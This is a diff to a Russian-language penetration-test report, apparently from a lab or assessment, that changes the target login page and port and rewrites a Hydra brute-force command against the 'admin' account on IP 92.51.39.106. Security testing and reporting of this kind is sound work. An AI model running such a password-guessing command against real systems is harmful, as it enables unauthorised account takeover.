@@ -25,7 +25,7 @@ ___
 
 **Уровень риска:** Средний
 
-**Целевая страница:** `http://92.51.39.106:8050/users/login.php`
+**Целевая страница:** `http://92.51.39.106:7788/login.html`
 
 **Краткое описание:**
 
@@ -49,10 +49,10 @@ ___
 Для реализации атаки была использована следующая конфигурация инструмента `Hydra`:
     
 ```
-hydra -l admin -P passwords.txt -s 8050 -t 4 -v -f 92.51.39.106 http-post-form "/users/login.php:username=^USER^&password=^PASS^:F=The username/password combination you have entered is invalid"    
+hydra -l admin -P passwords.txt -s 7788 -t 4 -v -f 92.51.39.106 http-post-form "/login.html:username=admin&password=^PASS^:F=Login Failed" -f -v   
 ```
 
-![](screenshots/TESTING/Brute_Force_Attack/8050/brute_admin.png)
+![](screenshots/TESTING/Brute_Force_Attack/7788/brute_admin.png)
    
 - **Вывод**
     
